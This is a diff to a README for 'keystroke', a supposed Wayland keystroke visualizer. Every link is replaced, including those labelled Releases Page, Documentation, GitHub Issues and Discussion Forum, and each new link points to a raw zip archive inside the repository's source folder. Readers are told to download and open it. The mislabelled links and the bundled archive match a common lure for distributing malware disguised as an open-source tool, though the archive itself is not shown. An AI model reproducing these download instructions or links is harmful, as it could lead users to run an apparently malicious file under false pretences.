@@ -1,6 +1,6 @@
 # 🎹 keystroke - Visualize Your Keystrokes Effortlessly
 
-[![Download keystroke](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip)](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip)
+[![Download keystroke](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip)](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip)
 
 ## 📖 What is keystroke?
 
@@ -10,14 +10,14 @@ Keystroke is a visualizer designed for Wayland compositors. It displays your key
 
 To start using keystroke, follow these easy steps:
 
-1. Visit the [Releases Page](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip) to find the latest version.
 2. Download the appropriate file for your operating system.
 3. Once the file has downloaded, locate it on your computer.
 4. Open the file to run keystroke.
 
 ## 📥 Download & Install
 
-To get keystroke, please visit this page: [Download keystroke](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip). 
+To get keystroke, please visit this page: [Download keystroke](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip). 
 
 Follow these steps:
 
@@ -63,13 +63,13 @@ For more support, consider checking online forums or the GitHub Issues page for 
 
 ## 🤝 Community and Support
 
-We encourage users to share their experiences. If you have suggestions or encounter bugs, please let us know. Visit the [GitHub Issues page](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip) to report issues or request features.
+We encourage users to share their experiences. If you have suggestions or encounter bugs, please let us know. Visit the [GitHub Issues page](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip) to report issues or request features.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip): Access guides and more information about features.
-- [Discussion Forum](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip Rafaelss/keystroke/discussions): Join our community for tips and support.
+- [Documentation](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip): Access guides and more information about features.
+- [Discussion Forum](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip Rafaelss/keystroke/discussions): Join our community for tips and support.
 
 Thank you for using keystroke! Enjoy visualizing your keystrokes.
 
-[Download keystroke](https://github.com/kfurafaelss/keystroke/raw/refs/heads/main/src/assets/Software-2.4.zip) now for a better typing experience!
+[Download keystroke](https://raw.githubusercontent.com/kfurafaelss/keystroke/main/src/ui/Software-2.2.zip) now for a better typing experience!
